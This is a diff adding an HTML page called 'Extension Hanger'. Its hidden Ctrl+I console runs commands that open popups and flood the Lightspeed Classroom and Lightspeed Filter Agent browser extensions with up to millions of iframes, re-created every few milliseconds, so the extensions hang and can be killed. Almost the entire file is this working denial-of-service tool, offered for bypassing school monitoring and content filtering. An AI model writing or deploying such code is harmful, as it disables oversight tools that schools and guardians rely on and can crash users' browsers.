@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Extension Hanger</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background-color: #0d0d1a;
+            color: #e0e0ff;
+            font-family: 'Consolas', 'Courier New', monospace;
+            overflow: hidden;
+        }
+
+        #cmd-box {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(13, 13, 26, 0.95);
+            border-bottom: 1px solid #4d5bce;
+            box-shadow: 0 0 30px rgba(77, 91, 206, 0.6);
+            padding: 10px 20px;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
+            z-index: 1000;
+        }
+
+        #cmd-box.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        #history {
+            max-height: 200px;
+            overflow-y: auto;
+            margin-bottom: 10px;
+            padding: 10px;
+            border-bottom: 1px solid rgba(77, 91, 206, 0.3);
+        }
+
+        #history div {
+            margin-bottom: 10px;
+            word-wrap: break-word;
+            color: #e0e0ff;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        #input-line {
+            display: flex;
+            align-items: center;
+        }
+
+        #input-line span {
+            color: #4d5bce;
+            margin-right: 10px;
+            font-size: 16px;
+        }
+
+        #cmd-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #e0e0ff;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 16px;
+            outline: none;
+            caret-color: #4d5bce;
+        }
+
+        #cmd-input:focus {
+            animation: glow 1.5s infinite alternate;
+        }
+
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 5px #4d5bce, 0 0 10px #4d5bce, 0 0 20px #4d5bce;
+            }
+            to {
+                text-shadow: 0 0 10px #4d5bce, 0 0 20px #4d5bce, 0 0 30px #4d5bce;
+            }
+        }
+
+        #history::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        #history::-webkit-scrollbar-track {
+            background: rgba(13, 13, 26, 0.3);
+        }
+
+        #history::-webkit-scrollbar-thumb {
+            background: #4d5bce;
+            border-radius: 4px;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(77, 91, 206, 0.1) 10%, transparent 10.01%);
+            background-size: 20px 20px;
+            animation: moveBackground 5s linear infinite;
+            z-index: -1;
+        }
+
+        @keyframes moveBackground {
+            from {
+                transform: translateY(0);
+            }
+            to {
+                transform: translateY(20px);
+            }
+        }
+
+        #cmd-input::placeholder {
+            color: rgba(224, 224, 255, 0.5);
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <div id="cmd-box">
+        <div id="history"></div>
+        <div id="input-line">
+            <span>C:\User></span>
+            <input type="text" id="cmd-input" autofocus placeholder="Type a command...">
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const historyDiv = document.getElementById("history");
+            const inputField = document.getElementById("cmd-input");
+            const cmdBox = document.getElementById("cmd-box");
+
+            // Extensions and their main.js file URLs
+            const extensions = {
+                "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/main.js",
+                "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/main.js",
+            };
+
+            let commandHistory = [];
+            let historyIndex = -1;
+            let defaultIframes = 1000000; // Default number of iframes (1,000,000)
+            let defaultTabs = 10; // Default number of tabs
+
+            // List of all available commands
+            const allCommands = [
+                "iframes set <number> - Set the number of iframes to create",
+                "iframes set max - Set the number of iframes to infinity (MAX POWER)",
+                "iframes - Show the default number of iframes",
+                "tabs set <number> - Set the number of tabs to open",
+                "tabs set max - Set the number of tabs to infinity (MAX POWER)",
+                "tabs - Show the number of tabs to be opened",
+                "controls - Show all available commands",
+                "time - Display the current time",
+                "clear - Clear the command history",
+                "disablelightspeedclassroom - Disable Lightspeed Classroom permanently (UNLIMITED POWER)",
+                "disablelightspeedfilter - Disable Lightspeed Filter permanently (UNLIMITED POWER)",
+                "disablelightspeed mix - Mix both extensions in each tab (UNLIMITED POWER)",
+            ];
+
+            // Show/hide command box on Ctrl + I
+            document.addEventListener("keydown", function (event) {
+                if (event.ctrlKey && event.key.toLowerCase() === "i") {
+                    event.preventDefault();
+                    cmdBox.classList.toggle("visible");
+                    if (cmdBox.classList.contains("visible")) {
+                        inputField.focus();
+                    }
+                }
+            });
+
+            // Handle user command input
+            inputField.addEventListener("keydown", function (event) {
+                if (event.key === "Enter") {
+                    let command = this.value.trim().toLowerCase();
+                    if (!command) return; // Ignore empty commands
+
+                    // Add command to history
+                    commandHistory.push(command);
+                    historyIndex = commandHistory.length;
+
+                    let newEntry = document.createElement("div");
+                    newEntry.innerHTML = `<span>C:\\User></span> ${command}`;
+                    historyDiv.appendChild(newEntry);
+
+                    // Execute command and display output
+                    let output = executeCommand(command);
+                    if (output) {
+                        let response = document.createElement("div");
+                        response.textContent = output;
+                        historyDiv.appendChild(response);
+                    }
+
+                    // Auto-scroll to the bottom
+                    historyDiv.scrollTop = historyDiv.scrollHeight;
+
+                    // Clear input
+                    this.value = "";
+                } else if (event.key === "ArrowUp") {
+                    event.preventDefault();
+                    if (historyIndex > 0) {
+                        historyIndex--;
+                        inputField.value = commandHistory[historyIndex];
+                    }
+                } else if (event.key === "ArrowDown") {
+                    event.preventDefault();
+                    if (historyIndex < commandHistory.length - 1) {
+                        historyIndex++;
+                        inputField.value = commandHistory[historyIndex];
+                    } else {
+                        historyIndex = commandHistory.length;
+                        inputField.value = "";
+                    }
+                }
+            });
+
+            // Command execution logic
+            function executeCommand(command) {
+                let output = "";
+
+                if (command.startsWith("iframes set")) {
+                    let parts = command.split(" ");
+                    if (parts.length > 2 && parts[2] === "max") {
+                        defaultIframes = Number.MAX_SAFE_INTEGER; // Set iframes to the maximum safe integer
+                        output = `Default iframes set to infinity (MAX POWER: ${defaultIframes})`;
+                    } else if (parts.length > 2 && !isNaN(parts[2])) {
+                        defaultIframes = parseInt(parts[2]);
+                        output = `Default iframes set to ${defaultIframes}`;
+                    } else {
+                        output = `Usage: iframes set <number> or iframes set max`;
+                    }
+                } else if (command === "iframes") {
+                    output = `Default number of iframes: ${defaultIframes}`;
+                } else if (command.startsWith("tabs set")) {
+                    let parts = command.split(" ");
+                    if (parts.length > 2 && parts[2] === "max") {
+                        defaultTabs = Number.MAX_SAFE_INTEGER; // Set tabs to the maximum safe integer
+                        output = `Default tabs set to infinity (MAX POWER: ${defaultTabs})`;
+                    } else if (parts.length > 2 && !isNaN(parts[2])) {
+                        defaultTabs = parseInt(parts[2]);
+                        output = `Default tabs set to ${defaultTabs}`;
+                    } else {
+                        output = `Usage: tabs set <number> or tabs set max`;
+                    }
+                } else if (command === "tabs") {
+                    output = `Number of tabs to be opened: ${defaultTabs}`;
+                } else if (command === "controls") {
+                    output = "Available commands:";
+                    let commandList = document.createElement("ul");
+                    allCommands.forEach(cmd => {
+                        let listItem = document.createElement("li");
+                        listItem.textContent = cmd;
+                        commandList.appendChild(listItem);
+                    });
+                    historyDiv.appendChild(commandList);
+                } else if (command === "time") {
+                    output = new Date().toLocaleTimeString();
+                } else if (command === "clear") {
+                    historyDiv.innerHTML = ""; // Clear the history
+                    return ""; // Skip adding output to history
+                } else if (command === "disablelightspeedclassroom") {
+                    output = "Lightspeed Classroom has been permanently disabled! (UNLIMITED POWER)";
+                    disableExtension("Lightspeed Classroom", extensions["Lightspeed Classroom"]);
+                } else if (command === "disablelightspeedfilter") {
+                    output = "Lightspeed Filter has been permanently disabled! (UNLIMITED POWER)";
+                    disableExtension("Lightspeed Filter Agent", extensions["Lightspeed Filter Agent"]);
+                } else if (command === "disablelightspeed mix") {
+                    output = "Mixing Lightspeed Classroom and Filter in each tab! (UNLIMITED POWER)";
+                    disableExtensionsMix();
+                } else {
+                    output = "Command not recognized";
+                }
+
+                return output;
+            }
+
+            // Function to disable an extension permanently
+            function disableExtension(extName, extURL) {
+                for (let i = 0; i < defaultTabs; i++) {
+                    const popup = window.open("", "PopupWindow", "width=100,height=100");
+                    if (!popup) {
+                        console.error("Pop-up blocked! Please allow pop-ups for this site.");
+                        return;
+                    }
+
+                    const popupDocument = popup.document;
+                    const popupBody = popupDocument.body;
+                    const iframeContainer = popupDocument.createElement('div');
+                    iframeContainer.id = 'iframeContainer';
+                    popupBody.appendChild(iframeContainer);
+
+                    // Flood the extension with iframes
+                    floodIframes(iframeContainer, extURL, defaultIframes);
+
+                    setTimeout(() => {
+                        popup.close();
+                        const killExtensionText = document.createElement("div");
+                        killExtensionText.innerHTML = `Now that the extension <strong>${extName}</strong> has been hanged, you can kill it.`;
+                        historyDiv.appendChild(killExtensionText);
+                    }, 10000);
+                }
+            }
+
+            // Function to disable multiple extensions permanently
+            function disableExtensionsMix() {
+                for (let i = 0; i < defaultTabs; i++) {
+                    const popup = window.open("", "PopupWindow", "width=100,height=100");
+                    if (!popup) {
+                        console.error("Pop-up blocked! Please allow pop-ups for this site.");
+                        return;
+                    }
+
+                    const popupDocument = popup.document;
+                    const popupBody = popupDocument.body;
+                    const iframeContainer = popupDocument.createElement('div');
+                    iframeContainer.id = 'iframeContainer';
+                    popupBody.appendChild(iframeContainer);
+
+                    const urls = [
+                        extensions["Lightspeed Classroom"],
+                        extensions["Lightspeed Filter Agent"]
+                    ];
+
+                    // Flood both extensions with iframes
+                    floodIframes(iframeContainer, urls[0], defaultIframes / 2);
+                    floodIframes(iframeContainer, urls[1], defaultIframes / 2);
+
+                    setTimeout(() => {
+                        popup.close();
+                        const killExtensionText = document.createElement("div");
+                        killExtensionText.innerHTML = `Now that both extensions have been hanged, you can kill them.`;
+                        historyDiv.appendChild(killExtensionText);
+                    }, 10000);
+                }
+            }
+
+            // Function to flood iframes
+            function floodIframes(container, iframeSrc, iframeCount) {
+                for (let i = 0; i < iframeCount; i++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = iframeSrc;
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100px';
+                    container.appendChild(iframe);
+                }
+                setTimeout(() => {
+                    while (container.firstChild) {
+                        container.removeChild(container.firstChild);
+                    }
+                    floodIframes(container, iframeSrc, iframeCount);
+                }, 5);
+            }
+        });
+    </script>
+</body>
+</html>
